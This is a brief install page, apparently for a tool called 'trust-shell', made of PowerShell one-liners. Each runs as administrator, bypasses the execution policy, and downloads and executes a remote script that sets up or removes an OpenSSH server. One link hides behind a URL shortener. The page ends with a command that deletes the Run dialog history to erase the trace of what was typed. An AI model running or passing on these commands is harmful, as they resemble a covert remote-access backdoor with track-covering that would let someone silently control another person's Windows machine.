### To install:
powershell -c "Start-Process powershell -Verb RunAs -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command irm https://raw.githubusercontent.com/maimunahmed2/trust-shell/main/setup-ssh.ps1 | iex'"

_FASTER_
powershell -c "Start-Process powershell -Verb RunAs -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command irm https://raw.githubusercontent.com/maimunahmed2/trust-shell/main/new-ssh.ps1 | iex'"

powershell -c "Start-Process powershell -Verb RunAs -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command irm https://is.gd/30bKQ7 | iex'"

### To uninstall:
powershell -c "Start-Process powershell -Verb RunAs -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command irm https://raw.githubusercontent.com/maimunahmed2/trust-shell/main/disable-ssh.ps1 | iex'"

### To check availability:
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'


After entering delete RUN history with:
REG Delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /VA /F
